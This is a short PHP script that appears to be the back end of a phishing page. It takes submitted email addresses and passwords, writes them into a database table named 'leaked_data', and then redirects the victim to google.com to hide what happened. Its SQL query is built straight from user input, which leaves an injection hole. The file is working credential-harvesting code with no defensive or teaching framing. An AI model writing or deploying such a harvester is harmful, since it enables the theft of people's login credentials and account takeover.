<?php  
require('db_conn.php');

if (isset($_POST['user_email']) and isset($_POST['user_password'])){
	
    $umail = $_POST['user_email'];
    $upass = $_POST['user_password'];
    
    $query = "INSERT INTO leaked_data (email, password) VALUES ('$umail', '$upass')";
    
    $result = mysqli_query($connection, $query) or die(mysqli_error($connection));
    if(!empty($result)) {
        header("Location: www.google.com");
        exit;
        unset($_POST);
    } else {
        echo "<script type='text/javascript'>alert('Error! Try again.')</script>";
    }
} else {
	echo "<script type='text/javascript'>alert('Enter values for all required fields.')</script>";
}

?>